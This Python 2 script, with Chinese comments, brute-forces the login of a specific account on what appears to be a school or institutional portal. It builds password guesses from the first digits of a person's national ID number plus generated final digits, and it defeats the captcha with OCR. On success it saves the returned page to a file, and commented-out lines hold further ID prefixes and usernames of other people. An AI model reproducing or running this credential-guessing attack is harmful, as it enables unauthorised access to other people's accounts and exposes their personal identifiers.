#!/usr/bin/python
# coding:utf8
import Login,InfoHandle
import json,time,datetime

if __name__=='__main__':
    now = datetime.datetime.now( )  #->这是时间数组格式
    # 转换为指定的格式:
    start_time = now.strftime( "%Y-%m-%d %H:%M:%S" )
    print 'start time is '+start_time
    #单的身份证前几位
    #firstPasswd = '32090319961216'
    #jin de
    #firstPasswd = '33018519950802'
    firstPasswd = '32020119960723'
    #jin de
    #username = '14173306'
    username = '14163119'
    login = Login.Login(username=username)
    info = InfoHandle.InfoHandle()
    r = info.dataLast4(304,800,2)
    abcd = r.next()
    while abcd!=-1:
        passwd = firstPasswd+abcd
        abcd = r.next()
        login.set_password(passwd)
        while True:
            login.i += 1
            path = login.get_codeImage('code_qian')
            code_string = login.code_to_string( path )
            if login.i % 10 == 0:
                print '-----------------------------' + str( login.i ) + \
                      '------------------------------------'
            if code_string == '' or len(code_string) != 4:
                print 'Code No Recognition'
                continue

            # code_string = raw_input("please input code: ")
            result = login.logining( code_string ).read( )
            # print login.login_info
            # if login.login_info == ‘
            # json.loads()可以将一个json形式的字符串转化成一个字典
            info_json = json.loads( login.login_info )

            # print info_json['result']
            print code_string

            if info_json['msg'] == '验证码错误':
                continue
            # 判断登录是否成功，成功就跳出
            if info_json['result'] == 1:
                print result
                f = open('xinxi.html','w+')
                f.write(result)
                f.flush()
                f.close()
                #这个的目的是使程序终止
                abcd=-1
            break
        # 输出尝试次数
        print login.i

    now = datetime.datetime.now( )  # ->这是时间数组格式
    # 转换为指定的格式:
    finish_time = now.strftime( "%Y-%m-%d %H:%M:%S" )
    print 'start_time:'+start_time
    print 'finish_time:'+finish_time

















